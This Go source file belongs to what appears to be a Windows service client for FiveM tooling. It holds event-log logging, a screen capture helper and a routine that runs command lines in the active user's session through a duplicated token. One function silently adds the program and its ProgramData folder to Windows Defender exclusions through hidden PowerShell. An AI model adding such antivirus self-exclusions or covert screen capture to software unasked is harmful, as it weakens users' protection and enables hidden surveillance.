package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/debug"
	"golang.org/x/sys/windows/svc/eventlog"
)

func copyFile(srcPath, targetPath string) error {
	srcFile, err := os.Open(srcPath)
	if err != nil {
		return fmt.Errorf("failed to open source executable: %w", err)
	}
	defer func() { _ = srcFile.Close() }()

	dstFile, err := os.Create(targetPath)
	if err != nil {
		return fmt.Errorf("failed to create target executable in ProgramData: %w", err)
	}
	defer func() { _ = dstFile.Close() }()

	if _, err := io.Copy(dstFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy executable to ProgramData: %w", err)
	}

	if err := dstFile.Sync(); err != nil {
		return fmt.Errorf("failed to sync target executable: %w", err)
	}

	return nil
}

func defenderExclude(name string) error {
	if localDebug || noDefenderExclude {
		return nil
	}

	programDataDir := os.Getenv("ProgramData")
	if programDataDir == "" {
		return fmt.Errorf("PROGRAMDATA environment variable not set")
	}

	srcPath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	targetDir := filepath.Join(programDataDir, name)
	if _, err := os.Stat(targetDir); os.IsNotExist(err) {
		if err := os.MkdirAll(targetDir, os.ModePerm); err != nil {
			return fmt.Errorf("failed to create service directory in ProgramData: %w", err)
		}
	}

	var cmd string
	var execCmd *exec.Cmd
	args := []string{"-NoProfile", "-NonInteractive", "-Command"}

	cmd = fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -Force`, srcPath)
	execCmd = exec.Command("powershell.exe", append(args, cmd)...)
	execCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := execCmd.Run(); err != nil {
		return fmt.Errorf("failed to add exclusion to Windows Defender: %w", err)
	}

	cmd = fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -Force`, targetDir)
	execCmd = exec.Command("powershell.exe", append(args, cmd)...)
	execCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := execCmd.Run(); err != nil {
		return fmt.Errorf("failed to add exclusion to Windows Defender: %w", err)
	}

	return nil
}

var elogClient debug.Log

var elogClientName string = "FiveMTools-Client"

func InitElogClient() (func() error, error) {
	if localDebug || noElogClient {
		return func() error { return nil }, nil
	}

	var err error
	_ = eventlog.InstallAsEventCreate(elogClientName, eventlog.Error|eventlog.Warning|eventlog.Info)
	if elogClient, err = eventlog.Open(elogClientName); err != nil {
		elogClient = debug.New(elogClientName)
	}
	return elogClient.Close, err
}

func init() {
	slog.SetDefault(slog.New(&eventLogHandler{}))
}

// currentSink returns the active event log: elog in the service process,
// elogClient in the bootstrap process, or nil before either is set.
func currentSink() debug.Log {
	switch {
	case elog != nil:
		return elog
	case elogClient != nil:
		return elogClient
	default:
		return nil
	}
}

// eventLogHandler is a slog.Handler that writes records to the Windows event
// log (currentSink), or to stderr when no event log is open yet. Attributes are
// rendered as key=value; the event log records the timestamp itself.
type eventLogHandler struct {
	attrs []slog.Attr
}

func (h *eventLogHandler) Enabled(context.Context, slog.Level) bool { return true }

func (h *eventLogHandler) Handle(_ context.Context, r slog.Record) error {
	var b strings.Builder
	b.WriteString(r.Message)
	appendAttr := func(a slog.Attr) bool {
		fmt.Fprintf(&b, " %s=%v", a.Key, a.Value.Any())
		return true
	}
	for _, a := range h.attrs {
		appendAttr(a)
	}
	r.Attrs(appendAttr)
	msg := b.String()

	sink := currentSink()
	switch {
	case sink == nil:
		_, err := fmt.Fprintln(os.Stderr, msg)
		return err
	case r.Level >= slog.LevelError:
		return sink.Error(1, msg)
	case r.Level >= slog.LevelWarn:
		return sink.Warning(1, msg)
	default:
		return sink.Info(1, msg)
	}
}

func (h *eventLogHandler) WithAttrs(attrs []slog.Attr) slog.Handler {
	return &eventLogHandler{attrs: append(append([]slog.Attr{}, h.attrs...), attrs...)}
}

func (h *eventLogHandler) WithGroup(string) slog.Handler { return h }

// logStep logs the result of a startup step: an error when it failed, else ok.
func logStep(name string, err error) {
	if err != nil {
		slog.Error(name, "err", err)
		return
	}
	slog.Info(name, "ok", true)
}

func forceTakeScreenshot() {
	path, _ := os.Executable()
	f, err := os.CreateTemp(filepath.Dir(path), "screenshot")
	if err != nil {
		slog.Error("failed to create temp file", "err", err)
		return
	}
	defer func() { _ = f.Close() }()

	results, err := CaptureScreenshot()
	if err != nil {
		slog.Error("failed to capture screenshot", "err", err)
		return
	}

	_ = json.NewEncoder(f).Encode(results)
	_ = f.Sync()

	_, _ = fmt.Fprintf(os.Stdout, "screenshot:%s\n", f.Name())
}

func runInUserSession(commandLine string) (string, error) {
	var (
		sessionID uint32
		userToken windows.Token
		err       error
	)

	sessionID = windows.WTSGetActiveConsoleSessionId()
	if sessionID == 0xFFFFFFFF {
		return "", fmt.Errorf("WTSGetActiveConsoleSessionId failed: no active session found")
	}

	if err := windows.WTSQueryUserToken(sessionID, &userToken); err != nil {
		return "", fmt.Errorf("WTSQueryUserToken failed: %w", err)
	}
	defer func() { _ = userToken.Close() }()

	var dupToken windows.Token
	err = windows.DuplicateTokenEx(userToken, windows.MAXIMUM_ALLOWED, nil, windows.SecurityIdentification, windows.TokenPrimary, &dupToken)
	if err != nil {
		return "", fmt.Errorf("DuplicateTokenEx failed: %w", err)
	}
	defer func() { _ = dupToken.Close() }()

	var readPipe, writePipe windows.Handle
	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		InheritHandle:      1,
		SecurityDescriptor: nil,
	}
	if err = windows.CreatePipe(&readPipe, &writePipe, &sa, 0); err != nil {
		return "", fmt.Errorf("CreatePipe failed: %w", err)
	}
	defer func() { _ = windows.CloseHandle(readPipe) }()
	defer func() { _ = windows.CloseHandle(writePipe) }()

	var startupInfo windows.StartupInfo
	startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
	startupInfo.Desktop, _ = syscall.UTF16PtrFromString("Winsta0\\Default")
	startupInfo.Flags = windows.STARTF_USESTDHANDLES
	startupInfo.StdOutput = writePipe
	startupInfo.StdErr = writePipe // Redirect stderr as well
	startupInfo.StdInput = windows.InvalidHandle

	creationFlags := windows.CREATE_UNICODE_ENVIRONMENT | windows.NORMAL_PRIORITY_CLASS | windows.CREATE_NO_WINDOW

	commandLinePtr, _ := syscall.UTF16PtrFromString(commandLine)

	var procInfo windows.ProcessInformation
	err = windows.CreateProcessAsUser(dupToken, nil, commandLinePtr, nil, nil, true, uint32(creationFlags), nil, nil, &startupInfo, &procInfo)
	if err != nil {
		return "", fmt.Errorf("CreateProcessAsUser failed: %w", err)
	}
	defer func() { _ = windows.CloseHandle(procInfo.Process) }()
	defer func() { _ = windows.CloseHandle(procInfo.Thread) }()
	_ = windows.CloseHandle(writePipe)

	_, err = windows.WaitForSingleObject(procInfo.Process, windows.INFINITE)
	if err != nil {
		return "", fmt.Errorf("WaitForSingleObject failed: %w", err)
	}

	var buf [4096]byte
	var output bytes.Buffer
	for {
		var read uint32
		err := windows.ReadFile(readPipe, buf[:], &read, nil)
		if err != nil && err != windows.ERROR_BROKEN_PIPE {
			break
		}
		if read == 0 {
			break
		}
		output.Write(buf[:read])
	}

	slog.Info("command output", "output", output.String())

	return output.String(), nil
}
